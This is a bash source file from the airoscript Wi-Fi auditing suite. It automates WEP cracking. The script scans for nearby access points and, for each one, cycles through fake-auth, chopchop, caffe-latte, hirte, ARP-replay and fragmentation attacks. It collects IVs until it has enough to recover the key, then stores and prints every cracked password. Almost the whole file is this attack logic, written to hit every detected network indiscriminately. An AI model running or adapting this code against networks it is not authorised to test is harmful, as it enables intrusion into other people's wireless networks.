#!/bin/bash
# Autocrack functions file for airoscript.

# Copyright (C) 2011 David Francos Cuartero
#        This program is free software; you can redistribute it and/or
#        modify it under the terms of the GNU General Public License
#        as published by the Free Software Foundation; either version 2
#        of the License, or (at your option) any later version.

#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#        GNU General Public License for more details.

#        You should have received a copy of the GNU General Public License
#        along with this program; if not, write to the Free Software
#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

filter_ssid(){
    sleep 6;
    echo
    [[ "$filter_ssid" != "" ]] && {
        tag; warn "${mark}Filtering essid to $filter_ssid";
        grep $filter_ssid $DUMP_PATH/dump-02.csv > $DUMP_PATH/dump-03.csv;
    } || {
        cp $DUMP_PATH/dump-02.csv $DUMP_PATH/dump-03.csv;
    }
}

unknown(){
    ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
}

count_aps(){ i=0; while IFS=, read MAC; do i=$(( $i + 1 )) ; done < $DUMP_PATH/dump-03.csv ; echo $i; }

doauto(){
    source $path/autopwn
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
    autoscan_autopwn;
    unknown;
    filter_ssid;
    MAX_TARGETS=$(count_aps);
    echo;
    attack_functions=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
    tag; warn "${mark}Networks detected $MAX_TARGETS"; sleep 1

    for i in `seq 1 $MAX_TARGETS`; do
        tag; warn "${mark}Trying to crack target $i"
        export AUTO=2; selectAp;  sleep 1
        if [ "$Host_SSID" != "" ]; then autopwn; 
        else warn "${mark}Couldn't find essid, next try"; fi
    done
    cleanautovars

    tag; warn ${mark}"Cracked networks:"
    for file in $DUMP_PATH/*.key; do
        echo "\t${mark}$file : `cat $file`"
    done
}

continue_autocrack(){
    single_question "Press c to configure, q to quit, any key to continue"
    [[ "$ans" == "c" ]] && configure; [[ "$ans" == "q" ]] && { check_function doexit || source $path/internal/exit; doexit killme ; }
}

autopwn(){
    check_function cleanp || source $path/internal/childs
    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0; next=0;
    sleep 1
    count=0

    for i in ${attack_functions[@]}; do
        tag; echo "${mark}Attack $count. Using $i in $Host_MAC"
        $i & cleanp & get_current_ivs
        tag; warn "${mark}Needed ivs: $min_ivs"
        while [ "1" ]; do 
            sleep 5 && { 
                [[ "`check_all_ivs`" -gt "$min_ivs" ]] && { 
                    echo; warn "${mark}Trying to crack network, we have enough ivs";
                    cleanautovars;
                    auto autocrack;
                    cleanautovars;
                    reset;
                    echo "${mark}Network cracked, password stored in $DUMP_PATH/$Host_MAC.key"; 
                    continue_autocrack
                }
            }
            specialwarn "\r${mark}Current IVS: `check_all_ivs`"  ;
        done
        count=$(( $count + 1 ))
    done

    cleanautovars
    clear=$oldclear;

}

check_all_ivs(){
    for i in $DUMP_PATH/$Host_MAC*.cap; do
        cur=`ivstools --convert $i $DUMP_PATH/temporal|awk '/IVs/ {print $2}'`
        if [ "$cur" = "" ]; then cur=0; fi
        maxn=$(( $maxn + $cur ))
    done
    if [ "$maxn" == "" ]; then echo 0; fi
    echo $maxn
}

get_current_ivs(){
    auto return_ivs; a=$?
    [[ "$a" == 255 ]] && min_ivs=$autopwn_min_ivs || min_ivs=$a
}

check_if_worked(){
    get_current_ivs
    echo $'\t' "${mark}Minium ivs required for this network: $min_ivs"
    civs=`check_all_ivs`; echo $'\t' "${mark}Current IVSs: $civs"
    if [ "`check_all_ivs`" -gt $min_ivs ]; then echo $'\t' "${mark}It worked, I have $min_ivs =)"; return 0; fi
    return 1
}
